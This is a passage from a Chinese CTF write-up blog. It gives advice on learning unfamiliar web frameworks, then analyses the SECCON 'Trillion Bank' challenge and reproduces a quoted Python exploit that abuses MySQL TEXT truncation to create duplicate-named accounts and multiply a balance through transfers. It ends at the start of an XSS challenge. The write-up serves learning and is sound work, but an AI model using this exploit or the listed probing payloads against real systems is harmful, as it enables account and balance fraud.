class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span>- 数据库基础（SQL/NoSQL） | 建立“系统观”，不再把代码当黑盒 |<br>| <span class="hljs-strong">**2. 主动查文档和源码**</span> | 看到 <span class="hljs-code">`express`</span>, <span class="hljs-code">`qs`</span>, <span class="hljs-code">`flask`</span>, <span class="hljs-code">`django`</span> 等关键字：<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span>- 立刻去搜官方文档或 GitHub。<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span>- 重点看：<span class="hljs-strong">**参数解析、路由匹配、安全机制**</span>。<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span>- 例如：<span class="hljs-code">`qs`</span> 的 README 明确写了它支持嵌套对象和数组。 | 把“未知”变成“已知” |<br>| <span class="hljs-strong">**3. 搭建实验环境**</span> | 本地写几行代码验证你的猜想：<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><span class="hljs-code">```js&lt;br&gt;const qs = require(&#x27;qs&#x27;);&lt;br&gt;console.log(qs.parse(&#x27;flag[=]=asd&amp;flag=123&#x27;));&lt;br&gt;// 输出？&lt;br&gt;``` </span>| 实践出真知，记忆更深刻 |<br>| <span class="hljs-strong">**4. 关注“框架特性”而非“语言”**</span> | Node.js/Python/PHP 只是载体，真正重要的是：<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span>- Express 的中间件机制<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span>- Flask 的 template injection<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span>- Django 的 ORM 注入<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span>掌握一种，触类旁通。 | 提升学习效率 |<br><br>---<br><br><span class="hljs-section">### 3. “考到不了解的框架怎办？” —— 核心策略</span><br><br>当遇到完全陌生的框架时，别慌，按以下步骤走：<br><br><span class="hljs-section">#### 🔍 步骤 1：快速识别技术栈</span><br><span class="hljs-bullet">-</span> 看文件名：<span class="hljs-code">`app.py`</span> → Python/Flask? <span class="hljs-code">`server.js`</span> → Node.js?<br><span class="hljs-bullet">-</span> 看依赖：<span class="hljs-code">`package.json`</span> → Node.js, <span class="hljs-code">`requirements.txt`</span> → Python<br><span class="hljs-bullet">-</span> 看错误信息：500 错误可能暴露框架名<br><br><span class="hljs-section">#### 🧩 步骤 2：找“关键函数”和“数据流”</span><br><span class="hljs-bullet">-</span> 找输入点：<span class="hljs-code">`req.query`</span>, <span class="hljs-code">`req.body`</span>, <span class="hljs-code">`request.GET`</span>, <span class="hljs-code">`request.POST`</span><br><span class="hljs-bullet">-</span> 找输出点：<span class="hljs-code">`res.send()`</span>, <span class="hljs-code">`return render(...)`</span><br><span class="hljs-bullet">-</span> 找危险操作：<span class="hljs-code">`eval`</span>, <span class="hljs-code">`exec`</span>, <span class="hljs-code">`os.system`</span>, <span class="hljs-code">`数据库查询`</span>, <span class="hljs-code">`文件读写`</span>, <span class="hljs-strong">**SSRF 中的 `fetch`/`requests.get`**</span><br><br><span class="hljs-section">#### 📚 步骤 3：查该函数的文档</span><br><span class="hljs-bullet">-</span> 搜索：<span class="hljs-code">`express url.searchParams.append`</span> 或 <span class="hljs-code">`flask request.args.to_dict`</span><br><span class="hljs-bullet">-</span> 重点看：<span class="hljs-strong">**如何处理重复参数？如何处理特殊字符？是否有已知 CVE？**</span><br><br><span class="hljs-section">#### 💡 步骤 4：联想类似漏洞</span><br><span class="hljs-bullet">-</span> SSRF？→ 想办法绕过 host/protocol 检查<br><span class="hljs-bullet">-</span> SQLi？→ 想办法闭合引号或注释<br><span class="hljs-bullet">-</span> SSTI？→ 尝试 <span class="hljs-code">`&#123;%&#125;`</span>, <span class="hljs-code">`&#123;&#123;&#125;&#125;`</span>, <span class="hljs-code">`&lt;%= %&gt;`</span><br><span class="hljs-bullet">-</span> 参数污染？→ 试试 <span class="hljs-code">`?a=1&amp;a=2`</span><br><br>---<br><br><span class="hljs-section">### 🌟 最后一句话</span><br><br><span class="hljs-quote">&gt; <span class="hljs-strong">**“开发经验”不是门槛，而是你可以逐步积累的工具箱。**</span></span><br><span class="hljs-quote">&gt;</span><br><span class="hljs-quote">&gt; <span class="hljs-strong">**而你现在已经拥有了最宝贵的资产——分析问题的能力。**</span></span><br><br>继续加油！你完全有能力攻克任何题目。💪<br></code></pre></td></tr></table></figure><h2 id="Trillion-Bank"><a href="#Trillion-Bank" class="headerlink" title="Trillion Bank"></a>Trillion Bank</h2><p>在帕鲁杯做过 <strong>喵喵银行</strong>原来这是原题<br>当初好像是一个帐户一直重复给另一个账户转账就会有几率直接转任意数额。<br>不知道这次是什么情况</p><p>源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs js">## index.<span class="hljs-property">js</span><br><br><span class="hljs-keyword">import</span> fastify <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;fastify&quot;</span>;<br><span class="hljs-keyword">import</span> crypto <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;node:crypto&quot;</span>;<br><span class="hljs-keyword">import</span> fs <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;node:fs/promises&quot;</span>;<br><span class="hljs-keyword">import</span> db <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./db.js&quot;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span> ?? <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;No flag&quot;</span>) ?? process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TRILLION</span> = <span class="hljs-number">1_000_000_000_000</span>;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">fastify</span>();<br><br>app.<span class="hljs-title function_">register</span>(<span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&quot;@fastify/jwt&quot;</span>), &#123;<br>  <span class="hljs-attr">secret</span>: crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>),<br>  <span class="hljs-attr">cookie</span>: &#123; <span class="hljs-attr">cookieName</span>: <span class="hljs-string">&quot;session&quot;</span> &#125;,<br>&#125;);<br>app.<span class="hljs-title function_">register</span>(<span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&quot;@fastify/cookie&quot;</span>));<br><br><span class="hljs-keyword">const</span> names = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">auth</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">req, res</span>) =&gt; &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">await</span> req.<span class="hljs-title function_">jwtVerify</span>();<br>  &#125; <span class="hljs-keyword">catch</span> &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Unauthorized&quot;</span> &#125;);<br>  &#125;<br>&#125;;<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/register&quot;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> name = <span class="hljs-title class_">String</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">name</span>);<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-z0-9]+$/</span>.<span class="hljs-title function_">test</span>(name)) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Invalid name&quot;</span> &#125;);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (names.<span class="hljs-title function_">has</span>(name)) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Already exists&quot;</span> &#125;);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  names.<span class="hljs-title function_">add</span>(name);<br><br>  <span class="hljs-keyword">const</span> [result] = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">query</span>(<span class="hljs-string">&quot;INSERT INTO users SET ?&quot;</span>, &#123;<br>    name,<br>    <span class="hljs-attr">balance</span>: <span class="hljs-number">10</span>,<br>  &#125;);<br>  res<br>    .<span class="hljs-title function_">setCookie</span>(<span class="hljs-string">&quot;session&quot;</span>, <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">jwtSign</span>(&#123; <span class="hljs-attr">id</span>: result.<span class="hljs-property">insertId</span> &#125;))<br>    .<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Succeeded&quot;</span> &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/api/me&quot;</span>, &#123; <span class="hljs-attr">onRequest</span>: auth &#125;, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> [&#123; <span class="hljs-number">0</span>: &#123; balance &#125; &#125;] = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">query</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE id = ?&quot;</span>, [req.<span class="hljs-property">user</span>.<span class="hljs-property">id</span>]);<br>    req.<span class="hljs-property">user</span>.<span class="hljs-property">balance</span> = balance;<br>  &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">msg</span>: err.<span class="hljs-property">message</span> &#125;);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">user</span>.<span class="hljs-property">balance</span> &gt;= <span class="hljs-variable constant_">TRILLION</span>) &#123;<br>    req.<span class="hljs-property">user</span>.<span class="hljs-property">flag</span> = <span class="hljs-variable constant_">FLAG</span>; <span class="hljs-comment">// 💰</span><br>  &#125;<br>  res.<span class="hljs-title function_">send</span>(req.<span class="hljs-property">user</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/transfer&quot;</span>, &#123; <span class="hljs-attr">onRequest</span>: auth &#125;, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> recipientName = <span class="hljs-title class_">String</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">recipientName</span>);<br>  <span class="hljs-keyword">if</span> (!names.<span class="hljs-title function_">has</span>(recipientName)) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Not found&quot;</span> &#125;);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> [&#123; <span class="hljs-number">0</span>: &#123; id &#125; &#125;] = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">query</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE name = ?&quot;</span>, [recipientName]);<br>  <span class="hljs-keyword">if</span> (id === req.<span class="hljs-property">user</span>.<span class="hljs-property">id</span>) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Self-transfer is not allowed&quot;</span> &#125;);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> amount = <span class="hljs-built_in">parseInt</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">amount</span>);<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isFinite</span>(amount) || amount &lt;= <span class="hljs-number">0</span>) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Invalid amount&quot;</span> &#125;);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> conn = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">getConnection</span>();<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">await</span> conn.<span class="hljs-title function_">beginTransaction</span>();<br><br>    <span class="hljs-keyword">const</span> [&#123; <span class="hljs-number">0</span>: &#123; balance &#125; &#125;] = <span class="hljs-keyword">await</span> conn.<span class="hljs-title function_">query</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE id = ? FOR UPDATE&quot;</span>, [<br>      req.<span class="hljs-property">user</span>.<span class="hljs-property">id</span>,<br>    ]);<br>    <span class="hljs-keyword">if</span> (amount &gt; balance) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Invalid amount&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">await</span> conn.<span class="hljs-title function_">query</span>(<span class="hljs-string">&quot;UPDATE users SET balance = balance - ? WHERE id = ?&quot;</span>, [<br>      amount,<br>      req.<span class="hljs-property">user</span>.<span class="hljs-property">id</span>,<br>    ]);<br>    <span class="hljs-keyword">await</span> conn.<span class="hljs-title function_">query</span>(<span class="hljs-string">&quot;UPDATE users SET balance = balance + ? WHERE name = ?&quot;</span>, [<br>      amount,<br>      recipientName,<br>    ]);<br><br>    <span class="hljs-keyword">await</span> conn.<span class="hljs-title function_">commit</span>();<br>  &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>    <span class="hljs-keyword">await</span> conn.<span class="hljs-title function_">rollback</span>();<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">msg</span>: err.<span class="hljs-property">message</span> &#125;);<br>  &#125; <span class="hljs-keyword">finally</span> &#123;<br>    db.<span class="hljs-title function_">releaseConnection</span>(conn);<br>  &#125;<br><br>  res.<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Succeeded&quot;</span> &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> html = <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&quot;index.html&quot;</span>);<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>).<span class="hljs-title function_">send</span>(html);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(&#123; <span class="hljs-attr">port</span>: <span class="hljs-number">3000</span>, <span class="hljs-attr">host</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span> &#125;);<br></code></pre></td></tr></table></figure><p>db.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; <span class="hljs-built_in">setTimeout</span> <span class="hljs-keyword">as</span> sleep &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;node:timers/promises&quot;</span>;<br><span class="hljs-keyword">import</span> mysql <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;mysql2/promise&quot;</span>;<br><br><span class="hljs-keyword">const</span> db = mysql.<span class="hljs-title function_">createPool</span>(&#123;<br>  <span class="hljs-attr">host</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">MYSQL_HOST</span>,<br>  <span class="hljs-attr">user</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">MYSQL_USER</span>,<br>  <span class="hljs-attr">password</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">MYSQL_PASSWORD</span>,<br>  <span class="hljs-attr">database</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">MYSQL_DATABASE</span>,<br>  <span class="hljs-attr">connectionLimit</span>: <span class="hljs-number">10</span>,<br>&#125;);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">debug</span>(<span class="hljs-string">`[debug] DB: <span class="hljs-subst">$&#123;i&#125;</span>`</span>);<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">query</span>(<span class="hljs-string">&quot;SELECT 1&quot;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">debug</span>(<span class="hljs-string">&quot;[debug] DB: connected&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br>  &#125; <span class="hljs-keyword">catch</span> &#123;<br>    <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">1000</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">try</span> &#123;<br>  <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">query</span>(<span class="hljs-string">&quot;DROP TABLE IF EXISTS users&quot;</span>);<br>  <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">query</span>(<br>    <span class="hljs-string">`</span><br><span class="hljs-string">    CREATE TABLE users (</span><br><span class="hljs-string">      id INT AUTO_INCREMENT NOT NULL,</span><br><span class="hljs-string">      name TEXT NOT NULL,</span><br><span class="hljs-string">      balance BIGINT NOT NULL,</span><br><span class="hljs-string">      PRIMARY KEY (id)</span><br><span class="hljs-string">    )</span><br><span class="hljs-string">  `</span>.<span class="hljs-title function_">trim</span>()<br>  );<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">debug</span>(<span class="hljs-string">&quot;[debug] DB: initialized&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);<br>  process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> db;<br></code></pre></td></tr></table></figure><p>fuzz了一下sql和目录，都没结果<br>帕鲁杯的解法应该是竞争条件，但是这里：使用数据库事务 + FOR UPDATE 锁行，防止并发问题（如竞态条件导致超支）<br>源码喂给通义看了一下，发现的关键问题是源码只会在注册时检查数据库中是否有相同名，但是数据库里是没有限制相同名的，</p><p>看大佬的<a href="https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-seccon_ctf_13th_quals-alpacahack_round_7/">wp</a><br>看来这种大比赛都会给完整文件，能让你自己构建docker环境在本地调试。以前还不知道这么多东西是干什么用的。。。</p><p>那wp里的思路就是：<br>数据库使用TEXT类型保存name，TEXT最大长度为65535，docker配置了mysql参数–sql_mode为空，所以当数据发生溢出时不会报错直接截断。因此可以在mysql中插入同名用户。(对应db.js里的：”name TEXT NOT NULL,”)</p><p>利用超过限制长度的办法来绕过前端的不允许同名注册，但是数据库会截断超过最大长度而达到同名的注册，</p><p>大佬的exp：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://192.168.66.129:3000/&#x27;</span><br>base_name = <span class="hljs-string">&#x27;z&#x27;</span>*<span class="hljs-number">65535</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reg</span>(<span class="hljs-params">name : <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">tuple</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]:<br>    res1 = requests.post(url=url + <span class="hljs-string">&#x27;/api/register&#x27;</span>, json=&#123;<span class="hljs-string">&quot;name&quot;</span> : base_name&#125;)<br>    jwt_1 = res1.headers.get(<span class="hljs-string">&#x27;set-cookie&#x27;</span>).split(<span class="hljs-string">&#x27;session=&#x27;</span>, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]<br>  <br>    res2 = requests.post(url=url + <span class="hljs-string">&#x27;/api/register&#x27;</span>, json=&#123;<span class="hljs-string">&quot;name&quot;</span> : base_name + name&#125;)<br>    jwt_2 = res2.headers.get(<span class="hljs-string">&#x27;set-cookie&#x27;</span>).split(<span class="hljs-string">&#x27;session=&#x27;</span>, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]<br><br>    res3 = requests.post(url=url + <span class="hljs-string">&#x27;/api/register&#x27;</span>, json=&#123;<span class="hljs-string">&quot;name&quot;</span> : base_name + name + name&#125;)<br>    jwt_3 = res3.headers.get(<span class="hljs-string">&#x27;set-cookie&#x27;</span>).split(<span class="hljs-string">&#x27;session=&#x27;</span>, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-keyword">return</span> (jwt_1, jwt_2, jwt_3) <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    jwt_1, jwt_2, jwt_3 = reg(<span class="hljs-string">&#x27;ajdjsbvkj&#x27;</span>)<br><br>    balance = <span class="hljs-number">10</span><br>    <span class="hljs-keyword">while</span> (balance * <span class="hljs-number">2</span> - <span class="hljs-number">10</span>) &lt; <span class="hljs-number">1_000_000_000_000</span>:<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>    <br>        res = requests.post(url=url + <span class="hljs-string">&#x27;/api/transfer&#x27;</span>, json=&#123;<span class="hljs-string">&quot;recipientName&quot;</span> : base_name, <span class="hljs-string">&quot;amount&quot;</span> : balance&#125;, cookies=&#123;<span class="hljs-string">&quot;session&quot;</span> : jwt_2&#125;)<br>        res = requests.post(url=url + <span class="hljs-string">&#x27;/api/transfer&#x27;</span>, json=&#123;<span class="hljs-string">&quot;recipientName&quot;</span> : base_name, <span class="hljs-string">&quot;amount&quot;</span> : balance&#125;, cookies=&#123;<span class="hljs-string">&quot;session&quot;</span> : jwt_3&#125;)<br><br>        balance = balance * <span class="hljs-number">2</span><br>        <span class="hljs-built_in">print</span>(balance * <span class="hljs-number">2</span> - <span class="hljs-number">10</span>, end=<span class="hljs-string">&#x27;\r&#x27;</span>)<br><br>    <span class="hljs-built_in">print</span>(jwt_1)<br></code></pre></td></tr></table></figure><p>其关键点是index.js中的：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">UPDATE</span> users <span class="hljs-keyword">SET</span> balance = balance - ? <span class="hljs-keyword">WHERE</span> id = ?<br><span class="hljs-keyword">UPDATE</span> users <span class="hljs-keyword">SET</span> balance = balance + ? <span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span> = ?<br></code></pre></td></tr></table></figure><p>汇款扣除的时候是根据数据库里的id，但是汇款到账户的时候检索的是name<br>所以当汇款的时候，会有三个账户收到钱，包括转款的账户</p><p>扣款按ID：准确扣除指定用户的余额</p><p>加款按名称：给所有同名用户加钱（包括刚刚扣款的那个用户）</p><p>这样通过账户2和账户3循环转账，很快就能以指数级增长至一万亿</p><h2 id="Tanuki-Udon"><a href="#Tanuki-Udon" class="headerlink" title="Tanuki Udon"></a>Tanuki Udon</h2><p>看到留言板大概只能猜到xss，试了一下发现直接写xss没有用<br>查看源码,有一个web服务和一个bot服务，web是留言板，bot不知道是干嘛的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 